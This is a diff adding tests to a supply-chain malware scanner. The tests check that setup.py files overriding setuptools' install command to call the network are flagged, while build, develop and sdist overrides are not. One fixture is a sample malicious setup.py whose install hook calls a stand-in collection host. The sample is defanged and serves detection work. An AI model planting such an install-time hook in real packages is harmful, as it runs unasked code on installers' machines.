@@ -11255,3 +11255,139 @@ class TestWhatRealMalwareActuallyLooksLike:
             encoding="utf-8",
         )
         assert not self._rules(tmp_path)
+
+
+class TestWhoseMachineTheCodeRunsOn:
+    """`install_hook` is true of every `setup.py` ever written.
+
+    It has to be: the file's existence means arbitrary Python runs during a
+    build. What it does not mean is "this runs for everybody who installs the
+    package", and the difference is 82 of the 252 real malicious PyPI packages
+    left undetected after the encoded-command, decryption and reconnaissance
+    work -- the largest family remaining.
+
+    They are all the same shape: a `cmdclass` override of the `install`
+    command, which setuptools runs on the machine of whoever installs the
+    package, doing something that is no part of building it.
+
+    The composite was measured without the distinction first. `install_hook`
+    paired with egress or spawn put `saltstack/salt` and `vllm` at **critical**,
+    which are the two false positives rounds twenty-nine and thirty removed, so
+    it was reverted and the narrower context built instead. `vllm` subclasses
+    `build_ext` and `build_rust`; `saltstack/salt` subclasses `develop`, `sdist`
+    and `bdist_egg`; neither reaches a consumer installing from a wheel. Twelve
+    real Python projects were probed -- pytorch, transformers, PaddleOCR,
+    superset, youtube-dl among them -- and none overrides `install`.
+    """
+
+    MALICIOUS = (
+        "from setuptools import setup\n"
+        "from setuptools.command.install import install\n"
+        "import requests\n"
+        "\n"
+        "\n"
+        "class CustomInstall(install):\n"
+        "    def run(self):\n"
+        "        install.run(self)\n"
+        "        requests.get('https://collect.invalid/p')\n"
+        "\n"
+        "\n"
+        "setup(name='x', version='1', cmdclass={'install': CustomInstall})\n"
+    )
+
+    VLLM_SHAPE = (
+        "from setuptools import setup\n"
+        "from setuptools.command.build_ext import build_ext\n"
+        "from urllib.request import urlretrieve\n"
+        "\n"
+        "\n"
+        "class cmake_build_ext(build_ext):\n"
+        "    def run(self):\n"
+        "        urlretrieve('https://wheels.invalid/x.whl', filename='/tmp/x.whl')\n"
+        "\n"
+        "\n"
+        "setup(name='x', version='1', cmdclass={'build_ext': cmake_build_ext})\n"
+    )
+
+    SALT_SHAPE = (
+        "from setuptools import setup\n"
+        "from setuptools.command.develop import develop\n"
+        "from setuptools.command.sdist import sdist\n"
+        "from urllib.request import urlopen\n"
+        "\n"
+        "\n"
+        "class Develop(develop):\n"
+        "    def run(self):\n"
+        "        urlopen('https://bootstrap.invalid/b.sh')\n"
+        "\n"
+        "\n"
+        "class Sdist(sdist):\n"
+        "    def run(self):\n"
+        "        pass\n"
+        "\n"
+        "\n"
+        "setup(name='x', version='1', cmdclass={'develop': Develop, 'sdist': Sdist})\n"
+    )
+
+    NOT_WIRED_IN = (
+        "from setuptools import setup\n"
+        "from setuptools.command.install import install\n"
+        "import requests\n"
+        "\n"
+        "\n"
+        "class Unused(install):\n"
+        "    def run(self):\n"
+        "        requests.get('https://collect.invalid/p')\n"
+        "\n"
+        "\n"
+        "setup(name='x', version='1')\n"
+    )
+
+    def _scan(self, tmp_path, source: str) -> set[str]:
+        (tmp_path / "setup.py").write_text(source, encoding="utf-8")
+        return flagged(tmp_path)
+
+    def test_an_install_override_that_reaches_the_network(self, tmp_path) -> None:
+        assert "MALWARE.INSTALL.CONSUMER_CODE.001" in self._scan(tmp_path, self.MALICIOUS)
+
+    def test_a_build_command_override_is_not_one(self, tmp_path) -> None:
+        """vLLM's shape. `build_ext` runs when the package is built, and
+        fetching a build input there is what rounds twenty-nine and thirty
+        established as a true but non-blocking fact."""
+        assert "MALWARE.INSTALL.CONSUMER_CODE.001" not in self._scan(tmp_path, self.VLLM_SHAPE)
+
+    def test_develop_and_sdist_overrides_are_not_one(self, tmp_path) -> None:
+        """Salt's shape. `develop` runs on somebody typing `pip install -e` in
+        the project's own directory, `sdist` when it is packaged. Neither
+        reaches a consumer, which is the same reason npm's `prepare` is an
+        author-time hook. See `core.models.AUTHOR_TIME_HOOKS`."""
+        assert "MALWARE.INSTALL.CONSUMER_CODE.001" not in self._scan(tmp_path, self.SALT_SHAPE)
+
+    def test_a_subclass_nobody_wires_in_runs_on_nobody(self, tmp_path) -> None:
+        """Both halves are required. A class that subclasses `install` and is
+        never passed to `cmdclass` is dead code."""
+        assert "MALWARE.INSTALL.CONSUMER_CODE.001" not in self._scan(tmp_path, self.NOT_WIRED_IN)
+
+    def test_the_context_is_narrower_than_the_install_hook(self, tmp_path) -> None:
+        """The property the whole change rests on: every one of these is an
+        install hook, and only the first is consumer-time."""
+        from cordon_scanner.core.content import FileContent
+        from cordon_scanner.ecosystems.registry import EcosystemRegistry
+
+        ecosystem = EcosystemRegistry.get("pypi")
+        assert ecosystem is not None
+        consuming = []
+        for label, source in (
+            ("malicious", self.MALICIOUS),
+            ("vllm", self.VLLM_SHAPE),
+            ("salt", self.SALT_SHAPE),
+            ("not wired", self.NOT_WIRED_IN),
+        ):
+            raw = source.encode()
+            content = FileContent(path="setup.py", raw=raw, size=len(raw))
+            manifest = ecosystem.parse_manifest(content)
+            # Every one of them is a build hook.
+            assert any(hook.kind == "build" for hook in manifest.hooks), label
+            if any(hook.kind == "consumerinstall" for hook in manifest.hooks):
+                consuming.append(label)
+        assert consuming == ["malicious"]
